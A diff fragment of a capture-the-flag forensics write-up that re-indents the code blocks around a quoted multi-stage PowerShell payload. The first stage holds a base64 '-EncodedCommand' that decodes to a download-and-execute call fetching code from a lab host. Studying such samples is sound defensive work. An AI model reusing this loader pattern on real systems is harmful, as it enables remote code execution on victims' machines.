@@ -14,13 +14,13 @@ A forensic challenge involving a multi-stage PowerShell attack related to Thorin
 - Used netcat to connect to the provided Docker instance
 - Sent HTTP GET requests to different endpoints:
   1. `/update`: First stage payload
-```
+    ```
     function qt4PO { 
         if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") { exit } 
         powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik=" 
     } 
     qt4PO
-```
+    ```
   2. `/a541a`: Second stage payload with a custom authentication header
     ```
         function aqFVaq {
